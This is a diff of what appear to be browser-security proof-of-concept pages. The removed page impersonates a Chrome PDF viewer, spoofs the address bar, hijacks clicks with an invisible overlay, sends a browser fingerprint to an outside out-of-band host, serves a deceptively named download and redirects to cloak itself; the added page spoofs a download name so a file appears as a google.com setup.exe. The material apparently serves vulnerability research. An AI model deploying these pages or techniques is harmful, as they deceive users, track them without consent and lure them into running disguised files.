@@ -1,61 +1,14 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>Chrome PDF Report Viewer</title>
-  <style>
-    body { font-family: sans-serif; text-align: center; margin-top: 50px; }
-    .fake-url { background: #f1f3f4; padding: 10px; font-size: 14px; border-bottom: 1px solid #ccc; }
-    .overlay {
-      position: fixed; top: 0; left: 0;
-      width: 100%; height: 100%;
-      z-index: 9999;
-      background: transparent;
-    }
-  </style>
-</head>
-<body>
-  <div class="fake-url"><b>https://www.google.com/search?q=monthly+report+2025.pdf</b></div>
-  <h2>📄 Secure PDF Viewer</h2>
-  <p>Rendering Document...</p>
+<!-- spoofed-download-name-bug29.html -->
+<button id="download">Download Now</button>
 
-  <script>
-    // Spoof URL bar
-    history.pushState({}, '', '/search?q=monthly+report+2025.pdf');
+<script>
+document.getElementById('download').onclick = () => {
+  const blob = new Blob(["This is a spoofed payload"], { type: "application/octet-stream" });
 
-    // 1. Click overlay for hijack
-    const overlay = document.createElement('div');
-    overlay.className = 'overlay';
-    overlay.onclick = () => {
-      // 2. Fingerprint
-      const fp = {
-        ua: navigator.userAgent,
-        lang: navigator.language,
-        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        screen: screen.width + 'x' + screen.height
-      };
-
-      // 3. Send fingerprint
-      fetch('https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun/fp', {
-        method: 'POST',
-        body: JSON.stringify(fp),
-        headers: { 'Content-Type': 'application/json' }
-      });
-
-      // 4. Simulate file download
-      const blob = new Blob(["<h1>Deceptive Report</h1>"], { type: "text/html" });
-      const a = document.createElement('a');
-      a.href = URL.createObjectURL(blob);
-      a.download = "Monthly_Report_2025.html"; // deceptive .html
-      document.body.appendChild(a);
-      a.click();
-
-      // 5. Cloaking redirect
-      setTimeout(() => {
-        location.href = "https://www.google.com/search?q=chrome+security+patch";
-      }, 1000);
-    };
-    document.body.appendChild(overlay);
-  </script>
-</body>
-</html>
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob);
+  a.download = "google.com%2fsecure%2fsetup.exe";  // will be shown as "google.com/secure/setup.exe" in UI
+  document.body.appendChild(a);
+  a.click();
+};
+</script>
